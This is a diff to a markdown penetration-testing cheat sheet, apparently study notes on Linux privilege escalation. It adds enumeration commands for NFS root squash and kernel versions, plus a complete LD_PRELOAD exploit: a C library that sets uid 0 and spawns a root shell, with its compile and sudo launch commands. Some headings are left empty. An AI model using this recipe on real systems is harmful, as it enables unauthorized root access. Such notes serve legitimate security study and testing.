@@ -1799,8 +1799,52 @@ grep "create\|compress" /etc/logrotate.conf | grep -v "#"
 nc -nblp 9001
 ```
 
+### Misc
+#### Rootsquash
+```
+cat /etc/exports
+```
+#### Upload and execute shell if no_root_squash
 
 ## Linux Internals-Based Privilege Escalation
+### Kernel Exploits
+#### Kernel Exploit Enumeration
+```
+uname -a
+cat /etc/lsb-reloase 
+```
+#### Find a Relevant exploit, compile it on target machine, root
+
+### Shared Libraries
+#### Check for LD_PRELOAD
+```
+sudo -l
+```
+#### Create C Library
+```
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/bash");
+}
+```
+#### Compile C Library
+```
+gcc -fPIC -shared -o root.so root.c -nostartfiles
+```
+#### Execute Malicious File
+```
+sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
+```
+### Shared Object Hijacking
+### Python Library hijacking
+
+
 ## Recent 0-Days
 ## Hardening Considerations
 
